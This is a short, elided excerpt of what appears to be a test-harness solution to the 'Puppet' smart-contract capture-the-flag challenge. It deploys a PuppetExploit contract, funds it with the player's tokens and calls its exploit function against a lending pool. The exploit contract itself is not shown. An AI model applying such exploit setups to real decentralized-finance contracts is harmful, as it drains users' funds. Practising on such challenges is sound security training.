...
describe('[Challenge] Puppet', function () {
    ...
    it('Execution', async function () {
        ...
        console.log(uniswapFactory.functions)
        console.log(uniswapExchange.functions)
        console.log(await lendingPool.calculateDepositRequired(2))
        const Contract = await ethers.getContractFactory('PuppetExploit');
        ...
        await token.connect(player).transfer(contract.address, PLAYER_INITIAL_TOKEN_BALANCE)
        await contract.exploit();
        // const Attacker = await ethers.getContractFactory("PuppetExploit");
